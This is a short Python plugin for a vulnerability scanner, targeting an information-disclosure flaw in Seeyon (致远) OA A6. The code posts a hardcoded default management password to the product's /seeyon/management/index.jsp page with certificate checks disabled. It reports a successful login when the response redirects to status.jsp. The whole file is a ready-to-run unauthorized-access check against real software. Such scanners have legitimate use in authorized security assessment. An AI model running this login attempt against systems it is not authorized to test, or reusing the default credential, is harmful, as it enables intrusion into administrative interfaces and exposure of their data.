#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '致远OA A6 status.jsp 信息泄露漏洞',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Referer': url + '/seeyon/management/index.jsp',
      }
  target = '/seeyon/management/index.jsp'
  data={'password': 'WLCCYBD@SEEYON'}
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,allow_redirects=False,verify=False)
    if res.status_code == 302 and "Location" in res.headers and res.headers['Location'].endswith('/seeyon/management/status.jsp'):
      ret['huixian'] = '登录成功'
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret